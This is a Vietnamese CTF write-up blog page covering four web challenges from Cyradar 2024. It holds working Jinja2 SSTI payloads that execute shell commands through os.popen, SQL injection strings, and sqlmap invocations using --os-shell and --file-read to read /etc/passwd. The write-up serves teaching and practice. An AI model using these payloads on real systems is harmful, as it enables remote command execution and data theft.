@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Bài 1: SSTIKhi mở web lên có giao diện như sau:   &#x3D;&gt; Khả năng có 1 query string là name Cho name có giá trị là &#123;&#123;7*7&#125;&#125; để test SSTI &#x3D;&gt; Xuất hiện 49 &#x3D;&gt; có kh">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Writeup Cyradar 2024 CTF TTS&#x2F;CTV [WEB]">
+<meta property="og:url" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/index.html">
+<meta property="og:site_name" content="haonika&#39;s blog">
+<meta property="og:description" content="Bài 1: SSTIKhi mở web lên có giao diện như sau:   &#x3D;&gt; Khả năng có 1 query string là name Cho name có giá trị là &#123;&#123;7*7&#125;&#125; để test SSTI &#x3D;&gt; Xuất hiện 49 &#x3D;&gt; có kh">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/1.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/2.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/3.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/4.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/5.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/6.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/7.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/8.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/9.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/10.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/11.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/12.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/13.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/14.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/15.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/16.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/17.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/18.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/19.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/20.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/21.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/22.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/23.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/24.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/25.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/26.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/27.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/28.png">
+<meta property="article:published_time" content="2025-01-04T17:50:21.000Z">
+<meta property="article:modified_time" content="2025-09-18T01:50:15.247Z">
+<meta property="article:author" content="Duong Quang Hao">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Writeup Cyradar 2024 CTF TTS/CTV [WEB]</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Blogs</a></li><!--
+     --><!--
+       --><li><a href="/story/">Story</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/01/16/vcs-wu-2024/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/12/liveapi-hocmai-bug/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/&text=Writeup Cyradar 2024 CTF TTS/CTV [WEB]"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/&title=Writeup Cyradar 2024 CTF TTS/CTV [WEB]"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/&is_video=false&description=Writeup Cyradar 2024 CTF TTS/CTV [WEB]"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Writeup Cyradar 2024 CTF TTS/CTV [WEB]&body=Check out this article: https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/&title=Writeup Cyradar 2024 CTF TTS/CTV [WEB]"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/&title=Writeup Cyradar 2024 CTF TTS/CTV [WEB]"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/&title=Writeup Cyradar 2024 CTF TTS/CTV [WEB]"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/&title=Writeup Cyradar 2024 CTF TTS/CTV [WEB]"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/&name=Writeup Cyradar 2024 CTF TTS/CTV [WEB]&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/&t=Writeup Cyradar 2024 CTF TTS/CTV [WEB]"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Bai-1-SSTI"><span class="toc-number">1.</span> <span class="toc-text">Bài 1: SSTI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bai-2-SQL-Injection"><span class="toc-number">2.</span> <span class="toc-text">Bài 2: SQL Injection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bai-3-SSTI"><span class="toc-number">3.</span> <span class="toc-text">Bài 3: SSTI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bai-4-SQL-Injection"><span class="toc-number">4.</span> <span class="toc-text">Bài 4: SQL Injection</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Writeup Cyradar 2024 CTF TTS/CTV [WEB]
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Duong Quang Hao</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-04T17:50:21.000Z" class="dt-published" itemprop="datePublished">2025-01-05</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/ctf/" rel="tag">ctf</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Bai-1-SSTI"><a href="#Bai-1-SSTI" class="headerlink" title="Bài 1: SSTI"></a>Bài 1: SSTI</h1><p>Khi mở web lên có giao diện như sau:</p>
+<img src="/2025/01/05/cyradar-wu-2024/1.png" class="">
+
+<p>&#x3D;&gt; Khả năng có 1 query string là <code>name</code></p>
+<p>Cho <code>name</code> có giá trị là <code>&#123;&#123;7*7&#125;&#125;</code> để test SSTI</p>
+<p>&#x3D;&gt; Xuất hiện 49 &#x3D;&gt; có khả năng bị SSTI</p>
+<img src="/2025/01/05/cyradar-wu-2024/2.png" class="">
+
+<p>Test tiếp <code>name</code> &#x3D; <code>$&#123;&#123;<%[%'"&#125;&#125;%\.</code> để biết xem phía server đang dùng template engine nào</p>
+<img src="/2025/01/05/cyradar-wu-2024/3.png" class="">
+
+<p>&#x3D;&gt; Jinja2</p>
+<p>Sử dụng payload: <code>&#123;&#123; self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls /').read() &#125;&#125; </code></p>
+<p>Phát hiện có flag.txt</p>
+<img src="/2025/01/05/cyradar-wu-2024/4.png" class="">
+
+<p>Đọc flag.txt &#x3D;&gt; <code>&#123;&#123; self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /flag.txt').read() &#125;&#125;</code></p>
+<img src="/2025/01/05/cyradar-wu-2024/5.png" class="">
+
+<p>Flag: <code>Hello CyWeb&#123;w3b_3asy_sst1&#125;!</code></p>
+<h1 id="Bai-2-SQL-Injection"><a href="#Bai-2-SQL-Injection" class="headerlink" title="Bài 2: SQL Injection"></a>Bài 2: SQL Injection</h1><p>Bài 2 có giao diện như sau:</p>
+<img src="/2025/01/05/cyradar-wu-2024/6.png" class="">
+
+<p>Đọc source code &#x3D;&gt; SQL Injection</p>
+<p>Khi thử nhập username là <code>admin&#39; or 1 = 1 -- thì bị thật</code></p>
+<img src="/2025/01/05/cyradar-wu-2024/7.png" class="">
+
+<p>Tiếp theo em sử dụng tool SQLMap để đẩy nhanh tiến độ dump db</p>
+<p>Đầu tiên em sử dụng Burp Suite vào url bài web, đăng nhập thử, sau đó lấy request đưa vào file <code>request.txt</code></p>
+<p>Sau đó em sử dụng SQLMap như sau</p>
+<img src="/2025/01/05/cyradar-wu-2024/8.png" class="">
+
+<img src="/2025/01/05/cyradar-wu-2024/9.png" class="">
+
+<p>Thấy được 3 database sau:</p>
+<img src="/2025/01/05/cyradar-wu-2024/10.png" class="">
+
+<p>Thử dump database public (<code>-dbs</code>)</p>
+<img src="/2025/01/05/cyradar-wu-2024/11.png" class="">
+
+<p>Khi dump table users thì không thấy flag (<code>-D public -T users --dump</code>)</p>
+<img src="/2025/01/05/cyradar-wu-2024/12.png" class="">
+
+<p>Xem lại đề bài có vẻ gợi ý RCE</p>
+<img src="/2025/01/05/cyradar-wu-2024/13.png" class="">
+
+<p>&#x3D;&gt; Thêm option <code>--os-shell</code> để RCE</p>
+<img src="/2025/01/05/cyradar-wu-2024/14.png" class="">
+
+<p>Sau đó liệt kê thư mục gốc:</p>
+<img src="/2025/01/05/cyradar-wu-2024/15.png" class="">
+
+<p>Đọc file <code>flag.txt</code></p>
+<img src="/2025/01/05/cyradar-wu-2024/16.png" class="">
+
+<p>Flag: <code>CyWeb&#123;ThiS_i5_m3d!um5q1!r(3&#125;</code></p>
+<h1 id="Bai-3-SSTI"><a href="#Bai-3-SSTI" class="headerlink" title="Bài 3: SSTI"></a>Bài 3: SSTI</h1><img src="/2025/01/05/cyradar-wu-2024/17.png" class="">
+
+<p>Server đang reflect lại địa chỉ IP của client.</p>
+<p>Thử thêm <code>X-Forwarded-For</code> vào gói tin:</p>
+<img src="/2025/01/05/cyradar-wu-2024/18.png" class="">
+
+<p>&#x3D;&gt; Thử địa chỉ localhost nhưng không thấy gì</p>
+<p>Thử <code>&#123;&#123;7*7&#125;&#125;</code> ra 49</p>
+<img src="/2025/01/05/cyradar-wu-2024/19.png" class="">
+
+<p>Tiếp tục 1 số bước như bài 1 &#x3D;&gt; Jinja2 </p>
+<p>Và chèn payload sau: <code>&#123;&#123; self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls /').read() &#125;&#125;</code></p>
+<img src="/2025/01/05/cyradar-wu-2024/20.png" class="">
+
+<p>Đọc flag.txt: <code>&#123;&#123; self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /flag.txt').read() &#125;&#125;</code></p>
+<img src="/2025/01/05/cyradar-wu-2024/21.png" class="">
+
+<p>Flag: <code>CyWeb&#123;m3d!umsst!&#125;</code></p>
+<h1 id="Bai-4-SQL-Injection"><a href="#Bai-4-SQL-Injection" class="headerlink" title="Bài 4: SQL Injection"></a>Bài 4: SQL Injection</h1><img src="/2025/01/05/cyradar-wu-2024/22.png" class="">
+
+<p>Có vẻ giống bài 2 nhưng lần này với query string <code>order_by</code></p>
+<p>Sử dụng sqlmap check 1 số database</p>
+<img src="/2025/01/05/cyradar-wu-2024/23.png" class="">
+
+<p>&#x3D;&gt; xem xét db <code>chh</code></p>
+<p><strong>Note</strong>: 1 cách test bằng cơm nếu không dùng sqlmap: <code>?order_by=(SELECT (CASE WHEN ((SELECT substring(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)=&#39;a&#39;) THEN &#39;price&#39; ELSE (SELECT 7066 UNION SELECT 7211) END)) </code></p>
+<p>Phát hiện table flag</p>
+<img src="/2025/01/05/cyradar-wu-2024/24.png" class="">
+
+<img src="/2025/01/05/cyradar-wu-2024/25.png" class="">
+
+<p>Tuy nhiên thì đây là flag fake<br>Sau đó có thử option <code>--os-shell</code> tuy nhiên gặp lỗi (khả năng không upload được file) &#x3D;&gt; Không thể RCE được<br>Sau khi tìm hiểu thì có phát hiện ra sqlmap có thể đọc được file với <code>--file-read</code></p>
+<p><code>sqlmap -r request.txt --file-read=/etc/passwd</code></p>
+<p>Đầu tiên đọc file <code>/etc/passwd</code> xem có flag không</p>
+<img src="/2025/01/05/cyradar-wu-2024/26.png" class="">
+
+<p>Em nghĩ lại thì flag các bài trước đều được đặt ở &#x2F;flag.txt </p>
+<img src="/2025/01/05/cyradar-wu-2024/27.png" class="">
+<img src="/2025/01/05/cyradar-wu-2024/28.png" class="">
+
+<p>&#x3D;&gt; Flag: <code>CyWeb&#123;w3b_h@rd_sql1_0rderby&#125;</code></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Blogs</a></li>
+        
+          <li><a href="/story/">Story</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Bai-1-SSTI"><span class="toc-number">1.</span> <span class="toc-text">Bài 1: SSTI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bai-2-SQL-Injection"><span class="toc-number">2.</span> <span class="toc-text">Bài 2: SQL Injection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bai-3-SSTI"><span class="toc-number">3.</span> <span class="toc-text">Bài 3: SSTI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bai-4-SQL-Injection"><span class="toc-number">4.</span> <span class="toc-text">Bài 4: SQL Injection</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/&text=Writeup Cyradar 2024 CTF TTS/CTV [WEB]"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/&title=Writeup Cyradar 2024 CTF TTS/CTV [WEB]"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/&is_video=false&description=Writeup Cyradar 2024 CTF TTS/CTV [WEB]"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Writeup Cyradar 2024 CTF TTS/CTV [WEB]&body=Check out this article: https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/&title=Writeup Cyradar 2024 CTF TTS/CTV [WEB]"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/&title=Writeup Cyradar 2024 CTF TTS/CTV [WEB]"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/&title=Writeup Cyradar 2024 CTF TTS/CTV [WEB]"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/&title=Writeup Cyradar 2024 CTF TTS/CTV [WEB]"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/&name=Writeup Cyradar 2024 CTF TTS/CTV [WEB]&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://duonghaonika.github.io/2025/01/05/cyradar-wu-2024/&t=Writeup Cyradar 2024 CTF TTS/CTV [WEB]"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2025
+    Duong Quang Hao
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Blogs</a></li><!--
+     --><!--
+       --><li><a href="/story/">Story</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
